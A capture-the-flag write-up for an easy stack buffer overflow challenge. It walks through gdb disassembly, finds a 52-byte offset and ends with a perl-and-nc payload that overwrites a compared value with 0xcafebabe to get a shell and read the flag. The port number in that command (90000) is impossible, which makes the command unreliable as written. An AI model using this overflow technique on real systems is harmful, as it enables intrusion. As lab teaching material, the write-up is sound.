## Bof

| Level | Points |
| ----- | ------ |
| Easy | 5 |

> Nana told me that buffer overflow is one of the most common software vulnerability. 
Is that true?

#### Solution

Open `./bof` with `gdb` debugger then see

```
(gdb) disas func
Dump of assembler code for function func:
   0x0000062c <+0>:	push   %ebp
   0x0000062d <+1>:	mov    %esp,%ebp
   0x0000062f <+3>:	sub    $0x48,%esp
   0x00000632 <+6>:	mov    %gs:0x14,%eax
   0x00000638 <+12>:	mov    %eax,-0xc(%ebp)
   0x0000063b <+15>:	xor    %eax,%eax
   0x0000063d <+17>:	movl   $0x78c,(%esp)
   0x00000644 <+24>:	call   0x645 <func+25>
   0x00000649 <+29>:	lea    -0x2c(%ebp),%eax
   0x0000064c <+32>:	mov    %eax,(%esp)
   0x0000064f <+35>:	call   0x650 <func+36>
   0x00000654 <+40>:	cmpl   $0xcafebabe,0x8(%ebp)
   0x0000065b <+47>:	jne    0x66b <func+63>
   0x0000065d <+49>:	movl   $0x79b,(%esp)
   0x00000664 <+56>:	call   0x665 <func+57>
   0x00000669 <+61>:	jmp    0x677 <func+75>
   0x0000066b <+63>:	movl   $0x7a3,(%esp)
   0x00000672 <+70>:	call   0x673 <func+71>
   0x00000677 <+75>:	mov    -0xc(%ebp),%eax
   0x0000067a <+78>:	xor    %gs:0x14,%eax
   0x00000681 <+85>:	je     0x688 <func+92>
   0x00000683 <+87>:	call   0x684 <func+88>
   0x00000688 <+92>:	leave  
   0x00000689 <+93>:	ret    
End of assembler dump.
```

Inline `<func+40>` and see the hex `0xcafebabe` is compared to `0x8(%esp)`, we can guest `0xdeadbeef` would be placed in `$ebp+0x8`. Let's see:

```
(gdb) b *func+40
Breakpoint 1 at 0x654
```
```
(gdb) x $ebp+0x8
0xffffcee0:	0xdeadbeef
```

Inline `<func+29>`, we see program loads the effective address `%ebp-0x2c` into `%eax`, maybe the variable `overflowme` is stored in `%ebp-0x2c`. Let's see:

```
(gdb) b gets
Breakpoint 2 at 0xf7e623b6
```
```
(gdb) r
Starting program: /home/traioi/bof 

Breakpoint 2, 0xf7e623b6 in gets () from /lib32/libc.so.6
```
```
(gdb) n
Single stepping until exit from function gets,
which has no line number information.
traioi

Breakpoint 1, 0x56555654 in func ()
```
```
(gdb) x/1s $ebp-0x2c
0xffffceac:	"traioi"
```

Now we have
```
0xffffcee0:	0xdeadbeef
0xffffceac:	"traioi"
```

Let’s calculate the offset between the two addresses 
```
perl -e 'print 0xffffcee0 - 0xffffceac;'
52
```
So two address have 52 bytes and we can get flag with
```
(perl -e 'print "a"x52 . "\xbe\xba\xfe\xca";'; cat - ) | nc pwnable.kr 90000
cat flag
```

